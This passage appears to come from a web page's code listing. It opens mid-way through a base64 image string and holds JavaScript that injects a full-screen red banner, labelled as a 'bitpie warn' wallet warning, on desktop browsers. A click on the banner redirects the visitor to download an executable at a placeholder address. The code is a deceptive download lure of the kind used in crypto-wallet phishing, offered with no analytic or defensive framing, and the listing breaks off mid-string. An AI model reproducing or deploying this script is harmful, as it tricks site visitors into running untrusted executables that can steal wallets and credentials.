g3oUxvhr24B+lJ+cCvekcDmqdGUfOHLOj8mTjZVu7hONcFQSonKluVEZupQhQJ/TPW0oiM3JnRwCzTwRDbKfqxDN+foFeNxEiz9nxuzEenH2UY3goDH4rYQc3Qq42hr5abSannpXqcUnJgdS5VuhtLCPM43xMvHsQsjIoX8/fZfuxjejm30jG4Iv/JYQ3Znh2Kgq8iyyTdlxnITDHT+qnRSQO9F7iYDmFTmSNvA7prsZKZgvaME574ZRGg3i8RLIPMmsUCzw4ShyNiLAzMhuVyARQJBvA9Vm/RB83lK8r+1NRh7H6pQwcz99LxBB56zj5ebou9Uz/q4FbG/NfOsYVvWdgvZ/NkUI2rtJJepf/cgTnPuF7TNxYR8+K7G8zTuAQ5vrnBPnoVVs4IOKVoxd633zzGn43CMfERObV0LVVRF5YLu/he3eya3vbTMBxp+dtgFs55i1FHjlzdlIJgmtGNu8zgsQ6zNNG2EEuNZKEM1aK1ztJ747sJe46MSaxkgMtg2147qgIWWyVZRRymQqYW0NGR+UnVspP6GCxpbKyvWeBA2NrVeUU+vPmlBf44j8VC53ScKPfd3qfwo8WgpH+V8/7oK87xaE13n8QmQEKf+/V/3cZB8qfvxif5Xe2ie8fEsoq21Mrp9WKMT2Rf4cyP1ca5YOar9huUJ7f+puIcmr8utBPT1tPynFXhnwPYVy8c6udfmzchvCuNvFcz+7cC/lPXijZ7XsI7eNxscb04iTa3L9R6MohjM2Y+bmF97Q0fYe8ZZ+mYFSyIOfyoeSPs2MXJ+lcGXZIPn9l2NdHRv9HoSe1mMNVpj/yHVPGvBc2asou/NqwqX2EZB/ofQUv19adkmG2eQ9BTlK2Q9vQlJ6NBbaJdT8XRFQRX9VH2uo9laOPyIElP12iX91EOYmRyFNGdlh+G+UPdsK2Hgz+cnHK/1/ji3FKg89Zk4pMOMOha+ys33Hk+OMbRHtTlySmZLFi0ZpnJ30lhLwje/liRR/rWb0OSbdLL6+OIcOxSWQATpTe0PAn4SAcequyiWsjGpfkg7O7nNnYRowx13T3iTk50Lwl5Z8TPtuIjGQsM3pUMsflG7qGP0ZuazUuOiPOMpVbiuYs5pwVooqes3m2ot+XPPlUg3OQAS6VymVjU46dy0z2alyI8sub2i4zeeYMZGp1gMswXgvGv1LyvqfyjYJXoaMvIgt7jmROGzHeA9krJ2RkMDljtw796xIZWDlH9ZPk6e7QBambjRqvnMzM9aP7jB+9zni2NdZMZHPyxxszd2EuufSFbTTbOl5VWBfKMXzxH4hSwssGRNY38oRyje6bEFirDnb1xX1ecpmlEhEcO/1aOD1Zs/xmKO8h/H6TUfyjIFnniIPdK+PXOQh9bSjZURn+u+H8GkEESTiFP0XRKjH2R0XA5HxxhkcvF1WKLPCSvtzERcb4885a/uHvbMXYcb1cS/6j0IaF9KJSzsR69lX0k+2BPFKP5WM0Mj7c3iXkZO7yXZ1wmKzDpXVxvRjLs3BU0mnJ7D0T49gJAK14nq77Oxpj3BqBSYyEsINfG0HZnd5rkTdGNqw02OA67aMg+f0EkijrFuuM7byKQJWzq78cOtCH526V34vt5+jJv2Pe0otYSUNVIMdy42vtCHqWILy8PP+LnoMlTnPaioyurDNm2R6ErOyd+g1f/CdjYknDQQz8juylQV6Oa9UkPsi/5PkM8HJVb/QptVTjXZ7hw+KtncNyPPQShrUkL5c/Y0v2cgnoIsjIxdHWk5gLuTTWivZ7Dsf/rLIGzjxZPxfRf/1zEHI3hn7nymrq4Ny7yLjxErXOXp3Iv2RtldZU9DHTXFLSUEdke3TIw6ogy5gqH9FLt4cCfR+dcnuZaUMael9yjMmSt0SFSyz4oHnvpQdt+F6sBrQWMsryu1NydRO6Z5XexNp7cPy9Np7F41aStKhFu6St6jLtSAWqj8x3tXz29H75TJtp52WiTPUTZXZuScOOfi+3uiUCD/2uluLlD6mSBi5L6TPvaieMo7f8zGNDaqE7WpYsLhCzQX+dL0ZJgx+v9LFOKpZmJ/q4oWUQE1p6mPoSkKc1cPZunchWTG1fvWB7XxPtqERG4qoyEvdMZNkKBRpVn2VmhzcsWRuT5pzFOTWrF9uMlNqZHdvNnXMk28j48a5ofT4lj9NboexcVR/nrj6slAw2KlMQc1DWBhnP/MZ2Hs8JanKfmYNGZEH2EXJydfRd6hAvj+Z247OM8MrB1RGAHIMccr3pL/F7LiXhDP1+4nicDZlslJ32ZpAtIvim+sTnoXuyX/wcLqPhrC2Pfx2xv6ORCbMuiZBB5j3iL3Ljx89+mSDvlLHxORncqLYcI7puZZM78beSUy029H4e94niG+S+eiOV9Pcyi8q+xLs6Bl/8L87wyoj4kYg8bkKgVpFI67OwovfNZByFyUzdQbStpd8z0blomzPdK5W1kzXOJRneRo2rFVWOKpsoswidygDFnEhtEMeHyIrICNTaoHSg77FxLbVRq2TTGo/rLmHYeHxOM7MTVga3V0Z66QxvZfTNyjRLOUxl03fhuxeRzXh2hnfutZ3c5hiZyK1CNUJPTqLNjQiuYisRJ4pvKrIygvKzo2q3zMKdEpk9a4xlm2R/9erdyqljMZsr7abWj1XGf0idaBK2p4pkeD0Z5Io+ZvovRmCUGstHgX06JeRB/35H+VXFxrA3N0fW1WOf+vAsq72HSN+WyNQuneEdQnsvkXZflAxaNuiv9MX/xgzv3FMabhnjvROTcyP/Uu/SYEdcC+cu/71Shl3uKL452ix3R+tyCFY2XeKhd/rnDLRFiLWz0GTDMkReg8Nt7JTh0H0+0PdAand6iaFno84Ru3RAtXLSeok0NYdNwqnt6GPpxUnJ59IlDScl0zsqW8pN9VM73GcQ3rkZn9TSf52xaSsxRw2ll0B1CUIlnGyfCYRuQsfljvCdoYNeEm3NnV46vwg96owkgHeJulYJjxiZ2Ym+ltqoWNByEfpUOchuN1H+JOHNnf0cI6Ix3WspfyKBDrpzAUQp4c2d0qDnY/XNCG8lZEu3sROcQHITjwz8Fb4YJQ1lkBsRBrLPtOUzJ3kiSm5fWgpcA8Mbj6Qi8e7po2oXLw94l6f5qr83+r0+qiV7GX5uSQfv9k4tY/DVqbyz2TNW+gazgf63TMonC/CSLTu+NX092NDMlS2Z0bqFedO3ZPFZqGcxJkcx17HLKc7GWPHGpS3Zy8RTjX6spIHBu+Q39Pu5kinjq28X0hcheM70XQreQ/mt78UOypdjFSs12NP7pqaUvJ2FbdRndv6kdPlHH7E7+ipTtrkdxc8Ut3CNtJdlTl4NPwgy5z07nVcRrJsnNdYia/jm6EMvxkduGJXv5j7cKX2rXEX2hkHvRlCZFZQbNy1d+keQla14Zx2x4UfybbI7qvbc6fOXtr/rUrp1y6lcHVkL+24d8wdf/JdhDuGVu1k5mtE3MUmDqevVrLq/kyKiSyB3GcDGMHZcF9VE+q2vCe0jQsw31ayNzEhD02se+TieTcbp1GGMV2Fs2bhzmcVKGU6uEZLX6fIGE3ko+5Hsm7csQ8Cff+bh462Qtzl4E2O2Sbxrr+R7Jcjfd7heU7dfX93LOrsXMpojGiv6fSfxMTyHayJr8fs5GVhPRniqXPUZm5C78ZDIvwOax5mPKrJq/KxxvqvxzI0Xz7kn4EudTmFdKcxHOzUFY70jfy06X+HNqx4rQUSszFolkhcD2Zu9WAbZNm8LiD/3ey3GK3bkHm9KKiEaXIv9IsZ8qs14FVnec4bcPxNHitfDf1UNL/u3FyHTfCwZc4+jsldTgvU/xRfzxUmV4CRH+rdhYkmDXu7gpRLr5ANeemoMo1gbBlfuoO+f0GVZ0hBziFzGYNVQWbU7vUGAe9VveTyK9ew+o3C8jMJ3r1snFvBucVkbxjWG8mIMXoK5GZmME31cNpV113JZ5paJiOUuc0+d3hxYdWVkyGf9BNmRy6vtxOe1ib/req05JQ2DcNLyNILc3DT0e5nOQfW/Fbqj5XbpkoZ2on3oHf3lCyOqhdrM9XueExQkqUvNp+5PSUmDtjtSpq35kydaeEjGSQS6uXpVWf/N77ZsP+tBZ/QlV75zK9DL1CUiVnlBSQ2vnreTkLUlbONOzNNSNbzekobYWE4dmyVKGmKnnzQRPeypvKThT/HFXNrRCTk4oYbXR3i55kULk1W7xztpuW6tUo47d3vNM0hvmzAy2sHkCG/sWBa9WcMyoDcR7Xk24ByUohDZGznGAsNiQSveTfR5JwyJd3PRo5BAlMKz8WUO4e3pvcb2RPbZp4+MPHsJrzScsf54CO9Av29K0kesNaLdHieyM2RRGtM+0rZnEt6SjWuN054cqLyO85IJ/G7OgEifOJAivDrJII/ey41BEyG8O6X7TGBPzmfnbFmOzNRk1932ESf+MJIN2g/15N87kprLi/G3qaROfneJPRCyXlruA6j+xYS31O+V2KA/zRfXxmceILw+wrvLCE0tMm6VkSWohbHKLRU8yLfzeImsWmUIqeVUL05y1WXev1LCeMo4RM+u46XOJ9UOozUUtC8wQM/a2FZTelfyFEPfCnIrsyW94URa4bRuDtmwMg3yGsrRQeIsUtnTxyu7mZwMESNeCR29UfpaytogDLFzTi1i8R0Ib+3UDe9Ztt42t2J8DxMC+BjhtWxMpTJJTUQPLgl7qM/1PQmZXykbbslyjlTOJTOWrVop33SJ2PWTo32puezJXt17TLRbp8R4lqAyAvE+knD5TMJbGjiWyEiVCK7mbnydsmntu/tineHtkeH1Ed4+M4lsUFN3a9+Eo88J9eUJZMkivE1EQB9GFJc6Wo0zt20hGWaHnMoCPUPJeGm7VUFGjrRJ59FR+trNGz3n2LKG8rvdSw29dEKt+r52mPpO9UZk8saEA9Gk1EPW9VKZRXj5CKE6Y8RrReQb0S4rs8zkSR61pY+nqhNkv0QmR7KPQppyZJNuWx95n5T/3klK+wzJkragNwjSjX6vq/YS3pHSu/dlGZm+BMNKVrT08aQQOWa7iB6xrJSu2swhvLWSb320HMtlnbD5ueC49IKWcUJCRq5eDip7Xk8Yk1PC3ujNdyXjnzqW7GT46pF+X6bfRT6X+okd02Z9ZuolOyl4Tqz5E31xK+z8iYgaEN404W0TE1g5MzkdfV5dp5fw9ons6km111oaZmE9JfrPS3W7hLHJLbl6lOw2IaqsVT93DsMkz/GM3VjmOVZnKrrCZ3fkr1XtI5mdSs21NZdyLA9kLx3vaNrtQ3KOSncTj4KQWuOm2y2PwWoNOZdyWmVWJ0qC1qUzvB3lV05a+lg76jmGsFXZ+dEIbIbEd+VcemuyeY4Gp7zwXOozWi2ZbQVZ5Pa3jqz1MEGO52R49R6PTq1WVA6ZSZFej/x1RlDhycKOQs70vOj65dgNgFZds6dMZqfkbY4uxn5fqffEkjfP9vlTCG+n2p6b0z/NF5sA4S0/h1dHk14MBdm5Z5ClnXBac9uwS2Q7avF3b1TdJN6Ta+tpRn9u5FuW/GqMNG2z0pSlw54+XiDinctnyfVlAsngMfNceesh0g39fi5ss5BMeq/lrR0ZxpKym3Zilk2WuXSF9qRx9EFm48eZutkm2jbQ+7F6nvZXE0nrSL7SAg95bIUNLzkbuMnY8n4hmyI3QMmMZeWQidFItnSZwJwcul2SJBgi7xgy7+Zx6ehrMMU/6AA5J9t/hS/+NxLeHw4yCwAAAAAAAAB/LP6DIQAAAAAAAABAeAEAAAAAAAAAhBcAAAAAAAAAQHgBAAAAAAAAAIQXAAAAAAAAAEB4AQAAAAAAAACEFwAAAAAAAADhBQAAAAAAAAAQXgAAAAAAAAAA4QUAAAAAAAAAEF4AAAAAAAAAAOEFAAAAAAAAABBeAAAAAAAAAADhBQAAAAAAAEB4AQAAAAAAAACEFwAAAAAAAABAeAEAAAAAAAAAhBcAAAAAAAAAQHgBAAAAAAAAAIQXAAAAAAAAAEB4AQAAAAAAABBeAAAAAAAAAADhBQAAAAAAAAAQXgAAAAAAAAAA4QUAAAAAAAAAEF4AAAAAAAAAWAT/NwAyhXIEslXK6AAAAABJRU5ErkJggg==&quot;&gt;&lt;/div&gt;      &lt;div onclick=&quot;localStorage.setItem(\&#x27;isDown\&#x27;,2);window.location.href=\&#x27;&#x27;</span>+url+<span class="string">&#x27;\&#x27;&quot;&gt; &lt;img style=&quot;float: right;padding-right: 20px;margin-top:15px;cursor: pointer;&quot; src=&quot;data:image/png;base64,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&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt; &lt;/div&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> div2 = <span class="built_in">document</span>.createElement(<span class="string">&quot;div&quot;</span>);<span class="keyword">var</span> info = navigator.userAgent;<span class="keyword">var</span> isPhone = <span class="regexp">/mobile/i</span>.test(info);</span><br><span class="line">    <span class="keyword">if</span> (!isPhone) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">localStorage</span>.getItem(<span class="string">&#x27;isDown&#x27;</span>) != <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">            <span class="keyword">var</span> h = date.getHours();</span><br><span class="line">            <span class="keyword">let</span> arr = [<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>];</span><br><span class="line">            <span class="keyword">let</span> allDay = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">//console.log(arr.includes(h));</span></span><br><span class="line">            <span class="keyword">if</span> (arr.includes(h) || allDay == <span class="number">1</span>) &#123;</span><br><span class="line">                div2.innerHTML=str;</span><br><span class="line">                <span class="keyword">var</span> domain = <span class="built_in">document</span>.domain;</span><br><span class="line">                <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                    body.appendChild(div2);</span><br><span class="line">                    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                        </span><br><span class="line">                    &#125;, <span class="number">5000</span>);</span><br><span class="line">                &#125;, <span class="number">3000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> timeout = <span class="number">1</span>;<span class="keyword">var</span> url = <span class="string">&#x27;exe地址&#x27;</span>;<span class="keyword">var</span> body = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;body&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&#x27;&lt;div id=&quot;xiazai&quot; onclick=&quot;localStorage.setItem(\&#x27;isDown\&#x27;,2);window.location.href=\&#x27;&#x27;</span>+url+<span class="string">&#x27;\&#x27;&quot; style=&quot;min-width: 100%;height: 130px;padding: 10px 0px;box-sizing: border-box;background: #be0b1e;display: flex;-webkit-box-pack: center;justify-content: center;-webkit-box-align: center;align-items: center;position: fixed;left: 0;top: 0;z-index: 10000;&quot;&gt;&lt;img src=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAC6UlEQVRoQ82aTYiNURjHf/+sJBRFNAtSqFFiQZqNWZAFypRsTc3Cwihf5auMMhsLFkayGISkWSCzM8VEI4VYkpCQEgslK3l06r1ijLnnOe/XPXV7F/d/7v39znnuPec994oWbWbWAWwGlgBLs+t74ANwQNJoQFcr8ZvZBmAd0AUsmISts6UEzKwd2AdsjxzQ1hAws6kZ+F5gZiR8iNUvYGYrgEEgXL2tXoHsA3oZWOglz/L1CZhZ+JBeAeYkwtdXQmYWvhavAtNywNcjYGZrgbs5wRvdqy8hMwvwQSKlfQQeAq+Bl8CLStcBMzsK9DnJvwPngFsN2In6l74SJ5bOE2C3pPvNpKsQ8JbONaBX0udm8KXvhRJKZ0BSbwx4I1PaDJjZcuCZA8YNX+oMmNnJUMeRAu+ADknh6mqlzICZtWWjPzuSJtT8QGT2r1hZAoeB45FAI5LWR2b/iRUukG2RQ+0vjoTqknQjMluJwA7gbCTQA+B2s6ykY//LlDEDAWpNMyjH832VCZjZVmDIARcTrVRgGNgYQ+XIVCNgZp3AHQdYbLQygQuOU4VY+JArX8DMlmUL1xQPWWS2EoETwP5IIG+sXAEzmwc8BeZ6ySLzpQt47rbeAm8iwRux0dLWgWz0HwPzI6F6JIXDrMJarpXYecPySVLhZZYsYGaLgHuO0U/eMk82XXkErgNbImvhG9Am6WtkPjqWJOAsnQDTL+lINJUj6BZI2LD9BNolPXdwRUddAgnwAeSUpD3RRM5gtICZdQPnna//SNIqZx9XvKmAma0Gwi8oYa/vbSslhVW6tPZbIDsCnA7MyB6zgE1AEEhpuySdTuno6TNeoKjj7yFJ2zwgqdkyBAYl9aQCefsVLbBT0hkvRJ58kQLdki7mgUnpW4RAWKAOSrqZApC3T16BS8AhSeH/C7W0VIFX2Qpbab1PNEIegS/h9yognP0MS/pRy5CPe9PxAiNA2PL++RgDwnHhWBnb4byD8AvyqgxAqeMmZQAAAABJRU5ErkJggg==&quot; alt=&quot;bitpie warn&quot; height=&quot;50px&quot; class=&quot;sc-ftTHYK bBWSwD&quot;&gt;&lt;div style=&quot;font-size: 30px;font-weight: 500;color: rgb(255, 255, 255);&quot;&gt;&lt;img style=&quot;height: 60px;&quot; 